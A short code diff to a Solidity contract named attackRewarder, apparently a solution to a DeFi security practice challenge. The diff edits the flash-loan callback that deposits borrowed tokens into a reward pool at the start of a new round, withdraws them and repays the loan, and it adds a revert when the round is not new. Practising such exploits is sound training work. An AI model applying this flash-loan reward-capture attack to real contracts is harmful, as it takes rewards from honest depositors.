@@ -57,11 +57,11 @@ contract attackRewarder {
 
     function receiveFlashLoan(uint256 _amount) external {
         if (target.isNewRewardsRound() == true) {
-            target.deposit(_amount); //???
+            target.deposit(_amount); 
             target.withdraw(_amount);
             DVToken.transfer(address(FlashLoan), _amount);
         } else {
-            DVToken.transfer(address(FlashLoan), _amount);
+            revert("Not the first in the new round");
         }
     }
 }
